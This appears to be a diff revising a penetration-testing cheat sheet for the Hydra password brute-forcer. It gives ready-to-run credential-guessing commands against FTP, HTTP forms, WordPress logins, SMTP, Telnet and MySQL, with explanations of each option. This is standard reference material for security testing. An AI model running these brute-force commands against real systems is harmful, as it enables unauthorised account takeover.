@@ -1,29 +1,33 @@
 # Hydra
-# Hydra does not have a native default wordlist, using the Rockyou list is suggested
+## Hydra does not have a native default wordlist, we can use:
+## Good password lists to use are:
+## - 10_million_password_list_top_1000.txt 
+## - ...
+## - rockyou (this is too much in general for e.g., ssh)
 
-# Example launch
-# hydra -t 1 -l admin -P [path to password.lst] -vV [IPaddress] ftp
-# --> -t # = preform # tasks
-# --> -l NAME = try to log in with NAME
-# --> -P [filepath] = Try password
-# --> -vV = verbose mode, showing the login+pass for each attempt
-# --> -t 10 threads  
-# --> -w 30 Wait for timeout
-# --> -o output.txt generate report
-# Output file = -o hydra-http-post-attack.txt
-# We can add with -e combinations to the already existing combinations provided 
-# from the users and password files in particular we can use `n` or `s` or `r` 
-# or all the combinations of them, their meaning is:
-# * `n` adds for each user also the null password;
-# * `s` adds the combination of credentials username/username for each of the
-#     usernames;
-# * `r` adds for each combination username/password also the reversed
-#     password/username;
-# Where depending on the webpage and on the post we can have after url:
-# - http-get-form, in case of an http page with a get form
-# - https-get-form, in case of an https page with a get form
-# - http-post-form, in case of an http page with a post form
-# - https-post-form, in case of an https page with a post form
+## Example launch
+## hydra -t 1 -l admin -P [path to password.lst] -vV [IPaddress] ftp
+## --> -t # = preform # tasks
+## --> -l NAME = try to log in with NAME
+## --> -P [filepath] = Try password
+## --> -vV = verbose mode, showing the login+pass for each attempt
+## --> -t 10 threads  
+## --> -w 30 Wait for timeout
+## --> -o output.txt generate report
+## Output file = -o hydra-http-post-attack.txt
+## We can add with -e combinations to the already existing combinations provided 
+## from the users and password files in particular we can use `n` or `s` or `r` 
+## or all the combinations of them, their meaning is:
+## * `n` adds for each user also the null password;
+## * `s` adds the combination of credentials username/username for each of the
+##     usernames;
+## * `r` adds for each combination username/password also the reversed
+##     password/username;
+## Where depending on the webpage and on the post we can have after url:
+## - http-get-form, in case of an http page with a get form
+## - https-get-form, in case of an https page with a get form
+## - http-post-form, in case of an http page with a post form
+## - https-post-form, in case of an https page with a post form
 
 
 # HTTP Basic Authentication
@@ -39,36 +43,36 @@ hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
 hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi
 
 # HTTP Forms (General)
+## We specify the "request string" which will contain the
+## following elements separated by a colon `:`:
+## * pageOnWhichTheLoginHappens
+## * list of parameters, here we have to specify with ^USER^ and ^PASS^ where
+##     usernames and passwords will be inserted
+## * a character which may be F (for failing strings) or S for successful strings
+##     followed by an equal sign `=` and a string which appears in a failed attempt
+##     or in a successful attempt, if we do not specify F or S, F is the default
+##     also because this is the more natural option, we generally know which
+##     strings will appear when we fail a login but not the ones which will appear
+##     when it is successful (unless we are dealing with a known web
+##     technology/framework).
+##     Let's see some examples, We can specify a failure string with `:F=mystringincaseoffailure`
+##     while we can specify a success string with `:S=mystringincaseofsuccess`.
+##     But we may also see online `:mystring` and it will be the equivalent of
+##     `:F=mystring`
 hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
 "index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
-# We specify the "request string" which will contain the
-# following elements separated by a colon `:`:
-# * pageOnWhichTheLoginHappens
-# * list of parameters, here we have to specify with ^USER^ and ^PASS^ where
-#     usernames and passwords will be inserted
-# * a character which may be F (for failing strings) or S for successful strings
-#     followed by an equal sign `=` and a string which appears in a failed attempt
-#     or in a successful attempt, if we do not specify F or S, F is the default
-#     also because this is the more natural option, we generally know which
-#     strings will appear when we fail a login but not the ones which will appear
-#     when it is successful (unless we are dealing with a known web
-#     technology/framework).
-#     Let's see some examples, We can specify a failure string with `:F=mystringincaseoffailure`
-#     while we can specify a success string with `:S=mystringincaseofsuccess`.
-#     But we may also see online `:mystring` and it will be the equivalent of
-#     `:F=mystring`
 
 # HTTP Forms (Fail String)
+## in this example we are in an https post form situation, 
+## as we may notice as request line we have the following structure
+## page:parameters:F=message_to_show_in_case_of_failure
 hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&user=^USER^&pass=^PASS^:F=Bad login"
-# in this example we are in an https post form situation, 
-# as we may notice as request line we have the following structure
-# page:parameters:F=message_to_show_in_case_of_failure
 
 # HTTP Forms (Success String)
+## in this example we are in an https post form situation, 
+## as we may notice as request line we have the following structure
+## page:parameters:S=message_to_show_in_case_of_failure
 hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&user=^USER^&pass=^PASS^:S=Success!!"
-# in this example we are in an https post form situation, 
-# as we may notice as request line we have the following structure
-# page:parameters:S=message_to_show_in_case_of_failure
 
 
 # HTTP Get Login Forms (Fail String)
@@ -85,29 +89,29 @@ hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:
 -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
 
 # HTTP Post Login Forms 
+## in this case we specify that the cookie should be page/cookie
+## cookies can be specified with C=
+## and we also added an header with H= 
+## this header is called X-Foo and has as value Foo
 hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" \
 -L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
-# in this case we specify that the cookie should be page/cookie
-# cookies can be specified with C=
-# and we also added an header with H= 
-# this header is called X-Foo and has as value Foo
 
 # HTTP Post Login Forms (Fail String)
 hydra -L users.txt -P words.txt https://www.site.com https-post-form "/index.cgi:login&name=^USER^&password=^PASS^&login=Login:Not allowed" &
 
-### HTTP Post Login Forms ()
+# HTTP Post Login Forms
+## now we check for success by using S=Location, since wordpress uses a Location
+## header to redirect the user, we can think about S as a sort of grep applied to
+## the HTTP response
 hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
-# now we check for success by using S=Location, since wordpress uses a Location
-# header to redirect the user, we can think about S as a sort of grep applied to
-# the HTTP response
 
 # SMTP Login
+## Generally the port used for SMTP is 465 and common SMTP server for common email
+## services are:
+##     * smtp.mail.yahoo.com
+##     * smtp.gmail.com
+##     * smtp.live.com (but on poort 587)
 hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
-# Generally the port used for SMTP is 465 and common SMTP server for common email
-# services are:
-#     * smtp.mail.yahoo.com
-#     * smtp.gmail.com
-#     * smtp.live.com (but on poort 587)
 
 
 # Telnet Login
@@ -139,35 +143,31 @@ hydra -l user -P passlist.txt ftp://192.168.0.1
 
 
 # MySQL and other databases
-#
-# We can use hydra with many kinds of databases, anyway it is very important for
-# us to check that we have installed hydra with the adequate module to perform a
-# specific bruteforce.
-# 
-# **IMPORTANT**: if we did not install hydra with mysql5 support it will not work,
-# we can check the modules available by issuing a `hydra -h`, if we just see
-# `mysql(v4)` this means that our version will not be compatible with `mysql5`,
-# while if we see `mysql` then our version of hydra will be compatible also with
-# mysql5 databases.
+## We can use hydra with many kinds of databases, anyway it is very important for
+## us to check that we have installed hydra with the adequate module to perform a
+## specific bruteforce.
+## 
+## **IMPORTANT**: if we did not install hydra with mysql5 support it will not work,
+## we can check the modules available by issuing a `hydra -h`, if we just see
+## `mysql(v4)` this means that our version will not be compatible with `mysql5`,
+## while if we see `mysql` then our version of hydra will be compatible also with
+## mysql5 databases.
 
+# Bruteforce mysql
 hydra -L <your_username_file> -P <your_password_file> <IP> mysql -s 3306 -o output.txt
-# notice that this is equivalent to:
+or 
 hydra -L <your_username_file> -P <your_password_file> <IP> mysql -o output.txt
-# by default mysql uses port 3306 so we do not need to specify it,
-# anyway it is fundamental to specify it if the mysql port is different
 
 # Sending Hydra traffic through Proxy
-#
-# It is often useful to analyze what we are actually doing with hydra, to this
-# purpose we can send the traffic to an intercepting proxy such as Burp.
-# 
+## It is often useful to analyze what we are actually doing with hydra, to this
+## purpose we can send the traffic to an intercepting proxy such as Burp.
 # To do this, we just have to set an environment variable:
 export HYDRA_PROXY=http://127.0.0.1:8080
-# or
+or 
 export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 
-# From `hydra -v` we can indeed read:
-# Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
-# E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
-#      % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
-#      % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
-#      % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+## From `hydra -v` we can indeed read:
+## Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+## E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+##      % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+##      % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+##      % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
